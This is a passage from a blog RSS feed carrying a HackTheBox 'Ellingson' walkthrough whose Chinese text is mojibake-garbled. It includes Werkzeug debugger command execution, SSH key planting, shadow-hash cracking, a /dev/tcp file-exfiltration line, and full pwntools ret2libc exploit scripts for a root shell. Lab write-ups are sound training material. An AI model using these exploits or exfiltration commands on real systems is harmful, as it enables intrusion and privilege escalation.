print(f"bin_sh_addr = {hex(bin_sh_addr)}")

ret_addr = 0x0000000000401016

payload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload2)
p.interactive()
```

ç„¶åæˆ‘ä»¬è¿è¡Œï¼Œä½†æ˜¯æƒé™åªæ˜¯ `margo`çš„æƒé™

```bash
$ $ id
uid=1002(margo) gid=1002(margo) groups=1002(margo)
```

`GetRootShell`ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œå°†`shell`æƒé™æå‡ï¼Œå¯ä»¥ä½¿ç”¨`setuid`

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")

ret_addr = 0x0000000000401016

setuid_addr = libcbase + libc.sym['setuid']

payload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload2)
p.interactive()
```

è¿è¡Œè·å¾— `RootShell`

```bash
(pwn) âœ  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 22208
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7fc6c64fd9c0
libcbase:0x7fc6c647d000
system_addr:0x7fc6c64cc440
bin_sh_addr = 0x7fc6c6630e9a
[*] Switching to interactive mode

Enter access password: 
access denied.
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
```]]></content:encoded>
            <category>äºŒè¿›åˆ¶å®‰å…¨</category>
            <category>PWN</category>
            <category>ROP</category>
            <category>ret2text</category>
            <category>ret2shellcode</category>
            <category>ret2syscall</category>
            <category>ret2libc</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Ellingson]]></title>
            <link>https://www.sunsetaction.top/2025/06/15/HackTheBoxMachine - Ellingson</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/15/HackTheBoxMachine - Ellingson</guid>
            <pubDate>Sun, 15 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Ellingson https://app.hackthebox.com/machines/Ellingson | Linux | Hard Recon è®¿é—®HTTP å†…å®¹å‘Šè¯‰æˆ‘ä»¬ä»–ä»¬è¢«Ellingsonç—…æ¯’ç»™å‹’ç´¢äº†ï¼Œå¹¶ä¸”çŸ­æ—¶é—´å†…ä¸èƒ½è®¿é—®æœåŠ¡è¶…è¿‡äº”æ¬¡ï¼Œå¦åˆ™ä¼šè¢«ban (ç›®å½•æ‰«æä¹Ÿä¸è¡Œ...]]></description>
            <content:encoded><![CDATA[
# Machine - Ellingson

> https://app.hackthebox.com/machines/Ellingson | `Linux`Â |Â `Hard`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image.png)

## Recon

```bash
âœ  Ellingson nmap -sT -min-rate 5000 10.10.10.139
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST
Nmap scan report for 10.10.10.139
Host is up (0.062s latency).
Not shown: 886 closed tcp ports (conn-refused), 112 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

```bash
âœ  Ellingson nmap -sT -A -p 22,80 10.10.10.139   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST
Nmap scan report for 10.10.10.139
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
|_http-server-header: nginx/1.14.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   324.20 ms 10.10.16.1
2   43.94 ms  10.10.10.139

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
```

è®¿é—®`HTTP`

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image1.png)

å†…å®¹å‘Šè¯‰æˆ‘ä»¬ä»–ä»¬è¢«`Ellingson`ç—…æ¯’ç»™å‹’ç´¢äº†ï¼Œå¹¶ä¸”çŸ­æ—¶é—´å†…ä¸èƒ½è®¿é—®æœåŠ¡è¶…è¿‡äº”æ¬¡ï¼Œå¦åˆ™ä¼šè¢«`ban` (ç›®å½•æ‰«æä¹Ÿä¸è¡Œ)

å¾—åˆ°å¸¸è§å¯†ç ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨å¼±å¯†ç 

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image2.png)

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image3.png)

```bash
 Love,Secret,Sex,God
```

```bash
Margo Wallace
Eugene Belford
Duke Ellingson
Hal
```

ä¸€ä¸ªä¸€ä¸ªç”¨æˆ·å°è¯•ä¹‹åæ²¡ç»“æœ

## Traceback å‘½ä»¤æ‰§è¡Œ

ç½‘é¡µæ˜¯ç”±`Werkzeug`é©±åŠ¨çš„ï¼Œå¹¶ä¸”å¼‚å¸¸å¤„ç†æ˜¯`Traceback`

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image4.png)

è²Œä¼¼è¯´å¯ä»¥å‘½ä»¤æ‰§è¡Œ

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image5.png)

æˆåŠŸæ‰§è¡Œ `py` è¯­å¥

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image6.png)

## SSH å…¬é’¥

åå¼¹ `shell` ï¼Œè¿™é‡Œæ€ä¹ˆå¼¹éƒ½æ²¡æ³•å¼¹è¿‡æ¥

æˆ‘ä»¬å°è¯•å†™å…¬é’¥

```bash
>>> import os;print(os.popen('whoami').read())
hal

>>> import os;print(os.popen('pwd').read())
/

>>> import os;print(os.popen('ls -al /home/hal').read())
total 36
drwxrwx--- 5 hal  hal  4096 Jul 16  2021 .
drwxr-xr-x 6 root root 4096 Jul 16  2021 ..
-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout
-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc
drwx------ 2 hal  hal  4096 Jul 16  2021 .cache
drwx------ 3 hal  hal  4096 Jul 16  2021 .gnupg
-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile
drwx------ 2 hal  hal  4096 Jun 13 00:54 .ssh
-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo

>>> import os;print(os.popen('echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPj1PrDHdIKBOR5DxZjrQD5M3R4yRyMdJqSEDwP6SCfe root@kali\" > /home/hal/.ssh/authorized_keys').read())
```

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image7.png)

## Crack Shadow

å‘ç°`hal`ç”¨æˆ·æ‰€å±æœ‰è¶£çš„ç»„

```bash
hal@ellingson:~$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
```

æŸ¥æ‰¾ `group`ç»„æœ‰æƒé™çš„æ–‡ä»¶

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image8.png)

å‘ç°`shadow.bak`

```bash
hal@ellingson:~$ cat /var/backups/shadow.bak 
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

`john`ç ´è§£

```bash
âœ  Ellingson john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (theplague)     
iamgod$08        (margo)     
2g 0:01:56:26 DONE (2025-06-13 14:56) 0.000286g/s 2053p/s 3123c/s 3123C/s !!!playboy!!!7..*7Â¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

çš„åˆ°ä¸¤ä¸ªå¯†ç ï¼Œå…¶ä¸­`theplague`çš„å¯†ç æ˜¯ä¸æ­£ç¡®çš„ï¼Œ`margo`çš„å¯†ç æ˜¯æ­£ç¡®çš„

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image9.png)

`margo`ç”¨æˆ·å¯ä»¥æ‹¿åˆ°`user.txt`

```bash
margo@ellingson:~$ cat user.txt 
e6e956999a23f338ffd6d933bf79ca9c
```

## ç¼“å†²åŒºæº¢å‡º

### æ£€æŸ¥ç¨‹åº

è¿™é‡Œå¤§è‡´çœ‹äº†ä¸€ä¼šæ„Ÿè§‰æ²¡ä»€ä¹ˆé—®é¢˜

```bash
margo@ellingson:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/at              
/usr/bin/newgrp       
/usr/bin/pkexec           
/usr/bin/passwd             
/usr/bin/gpasswd            
/usr/bin/garbage               
/usr/bin/newuidmap            
/usr/bin/sudo                 
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/newgidmap                         
/usr/bin/chsh                             
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su                     
/bin/umount                 
/bin/ntfs-3g                   
/bin/ping                     
/bin/mount                    
/bin/fusermount
```

ä½†æ˜¯é—®é¢˜å‡ºç°åœ¨`garbage` ï¼Œæˆ‘ä»¥ä¸ºå®ƒæ˜¯`gc`ï¼ˆGarbage Collectionï¼‰

è¿è¡Œå®ƒçš„æ—¶å€™ï¼Œä¼šè®©ä½ è¾“å…¥å¯†ç 

```bash
margo@ellingson:~$ garbage
Enter access password: 111111111111111111111111111111111111111111111111111111

access denied.
```

æ‹‰å‡ºå»é€†å‘çœ‹ä¸€çœ¼

```bash
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+8h] [rbp-8h] BYREF
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  v4 = check_user(argc, argv, envp);
  set_username(v4);
  if ( !(unsigned int)auth(v4) )
    exit(-1);
  puts("[+] W0rM || Control Application");
  puts("[+] ---------------------------");
  puts("Select Option");
  puts("1: Check Balance");
  puts("2: Launch");
  puts("3: Cancel");
  puts("4: Exit");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        printf("> ");
        __isoc99_scanf("%d%*c", &v3);
        if ( v3 != 2 )
          break;
        launch();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_14;
      checkbalance();
    }
    if ( v3 != 3 )
    {
      if ( v3 == 4 )
        exit(0);
LABEL_14:
      puts("Unknown option");
      exit(-1);
    }
    cancel();
  }
}
```

æˆ‘ä»¬åœ¨å¼€å§‹è¿è¡Œçš„ `auth` å‡½æ•°ä¸­å‘ç°äº†å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´

ä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥å¯†ç çš„åœ°æ–¹ï¼Œä¼šæœ‰ç¼“å†²åŒºæº¢å‡ºï¼Œ`gets()` å‡½æ•°ä¼šæ— é™åˆ¶åœ°è¯»å–ç”¨æˆ·çš„è¾“å…¥ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ã€‚å¦‚æœæ”»å‡»è€…è¾“å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚`200`ä¸ªå­—ç¬¦ï¼‰ï¼Œå¤šå‡ºæ¥çš„`100`ä¸ªå­—ç¬¦å°±ä¼šæº¢å‡ºï¼Œè¦†ç›–æ‰æ ˆä¸Š `s1` ç›¸é‚»çš„å…¶ä»–æ•°æ®ã€‚

```bash
__int64 __fastcall auth(int a1)
{
  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF
  char s1[100]; // [rsp+80h] [rbp-80h] BYREF
  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF
  int v5; // [rsp+F0h] [rbp-10h]

  v5 = a1;
  strcpy(v4, username);
  printf("Enter access password: ");
  gets(s1);
  putchar(10);
  if ( !strcmp(s1, "N3veRF3@r1iSh3r3!") )
  {
    strcpy(dest, "access granted for user: ");
    strcat(dest, v4);
    syslog(6, dest);
    puts("access granted.");
    return 1LL;
  }
  else
  {
    puts("access denied.");
    return 0LL;
  }
}
```

`64`ä½ç¨‹åº

```bash
âœ  Ellingson file garbage 
garbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped
```

ä¿æŠ¤æªæ–½æƒ…å†µï¼Œå¼€å¯äº†`NX` 

```bash
âœ  Ellingson checksec garbage 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¼€å¯äº† `ALSR` ï¼Œå¼€å¯äº†å®Œå…¨`ALSR`

```bash
margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
```

è¿™é‡Œè¦ä½¿ç”¨ `ret2libc` æ”»å‡»

### å¯»æ‰¾ä¸€ä¸ªçœŸå®çš„åœ°å€

é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹`libc`æ–‡ä»¶

```bash
margo@ellingson:~$ ldd /usr/bin/garbage 
        linux-vdso.so.1 (0x00007ffcd37ec000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)
```

å°†`/lib/x86_64-linux-gnu/libc.so.6`ä¸‹è½½åˆ°é¶æœºä¸­

```bash
// kali
âœ  Ellingson nc -lvp 1234 > libc.so.6
// Machine
margo@ellingson:~$ cat /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234
```

é¦–å…ˆåˆ¤æ–­å¡«å……å€¼ï¼Œè¿™é‡Œä½¿ç”¨`garbage` 

```bash
(pwn) âœ  Ellingson pwndbg garbage 
pwndbg> cyclic 1024
aaaabaaacaaadaaa...acwaacxaacyaac
pwndbg> run
Starting program: /root/Desktop/HackTheBox/Ellingson/garbage 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter access password:aaaabaaacaaadaaa...acwaacxaacyaac
```

ç¨‹åºæœä¸å…¶ç„¶å´©æºƒäº†

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image10.png)

è®¡ç®—åç§»å€¼ï¼Œè¿™é‡Œä½¿ç”¨`msf`

```bash
âœ  Ellingson /usr/bin/msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image11.png)

```bash
pwndbg> x/xg 0x7fffffffdf58
0x7fffffffdf58: 0x3765413665413565
```

```bash
(pwn) âœ  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        
[*] Exact match at offset 136
```

å¾—åˆ°åç§»å€¼`136` ï¼ˆPSï¼šè¿™é‡Œä½¿ç”¨`pwndbg`çš„`cyclic`æ— æ³•å¾—åˆ°æ­£ç¡®åç§»å€¼ï¼Œä½†æ˜¯`WP`ä¸­ä½¿ç”¨`gef`ç­‰éƒ½å¯ä»¥å¾ˆå®¹æ˜“å°±å¾—åˆ°åç§»å€¼ï¼‰

å¾—åˆ°åç§»å€¼åï¼Œæˆ‘ä»¬é€‰æ‹©ä¸€ä¸‹è·å¾—å“ªä¸ª`plt`å‡½æ•°çš„çœŸå®åœ°å€

```bash
pwndbg> plt
Section .plt 0x401020 - 0x401170:
0x401030: putchar@plt
0x401040: strcpy@plt
0x401050: puts@plt
0x401060: fclose@plt
0x401070: getpwuid@plt
0x401080: getuid@plt
0x401090: printf@plt
0x4010a0: rewind@plt
0x4010b0: fgetc@plt
0x4010c0: read@plt
0x4010d0: fgets@plt
0x4010e0: strcmp@plt
0x4010f0: getchar@plt
0x401100: gets@plt
0x401110: syslog@plt
0x401120: access@plt
0x401130: fopen@plt
0x401140: __isoc99_scanf@plt
0x401150: strcat@plt
0x401160: exit@plt
```

`x64` ä¼ å‚éœ€è¦ä½¿ç”¨å¯„å­˜å™¨ï¼Œ`0x000000000040179b` ç¬¦åˆ

```bash
(pwn) âœ  Ellingson ROPgadget --binary garbage --only "pop|ret"
Gadgets information
============================================================
0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401798 : pop r14 ; pop r15 ; ret
0x000000000040179a : pop r15 ; ret
0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401239 : pop rbp ; ret
0x000000000040179b : pop rdi ; ret
0x0000000000401799 : pop rsi ; pop r15 ; ret
0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040153a : ret 0x4864
0x0000000000401485 : ret 0x8d48
0x00000000004012ce : ret 0xd089

Unique gadgets found: 15
```

è¿™é‡Œé€‰æ‹©è·å¾—`puts@plt` ï¼Œæˆ‘ä»¬é€šè¿‡`pwn`è¿æ¥`ssh` æ¥è°ƒè¯•

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_add = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_add:{hex(puts_real_add)}")
```

è¿è¡Œåæˆ‘ä»¬çš„å¾—åˆ°äº†`put`çš„çœŸå®åœ°å€`0x7f8eed3569c0`

```bash
(pwn) âœ  Ellingson python exp.py                              
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21277
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_add = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_add:0x7f8eed3569c0
```

### å¾—åˆ°åŸºåœ°å€

åŸºåœ°å€ = puts å‡½æ•°çœŸå®åœ°å€ - puts å‡½æ•°åç§»åœ°å€

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")
```

```bash
(pwn) âœ  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21460
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7f7ed83509c0
libcbase:0x7f7ed82d0000
```

### è·å¾—å…¶ä»–åœ°å€

å¾—åˆ°åŸºåœ°å€åï¼Œæˆ‘ä»¬è¦å¾—åˆ° `system` å’Œ `/bin/sh`çš„åœ°å€

å‡½æ•°çœŸå®åœ°å€ = åŸºåœ°å€ + å‡½æ•°åç§»å€¼

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")
```

```bash
(pwn) âœ  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21644
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7f41e478b9c0
libcbase:0x7f41e470b000
system_addr:0x7f41e475a440
bin_sh_addr = 0x7f41e48bee9a/3
```

### GetShell

å¾—åˆ°éœ€è¦çš„åœ°å€åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œè·å–`Shell`äº†

å†æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª`ret`æ¥å®ç°å †æ ˆå¹³è¡¡

```bash
(pwn) âœ  Ellingson ROPgadget --binary garbage --only "ret"    
Gadgets information
============================================================
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040153a : ret 0x4864
0x0000000000401485 : ret 0x8d48
0x00000000004012ce : ret 0xd089
```

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
